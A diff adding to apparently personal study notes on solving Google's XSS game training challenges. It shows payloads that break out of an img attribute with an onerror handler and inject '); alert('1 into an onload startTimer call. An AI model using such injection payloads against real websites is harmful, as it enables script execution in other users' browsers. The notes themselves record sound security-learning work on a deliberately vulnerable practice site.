@@ -651,3 +651,15 @@ html += "<img src='/static/level3/cloud" + num + ".jpg' />";
 
 if you add (') and add onerror event handler, it will work
 https://xss-game.appspot.com/level3/frame#' onerror="alert(document.domain)"
+___________________________________________________________________________________________________________________________________________________________________
+
+Create timer
+------------
+
+When you press 3 > it will work about minutes
+
+Orginal code --> <img src="/static/loading.gif" onload="startTimer('3');" />
+
+payload --> '); alert('1
+
+final result --> onload="startTimer(''); alert('1');" />
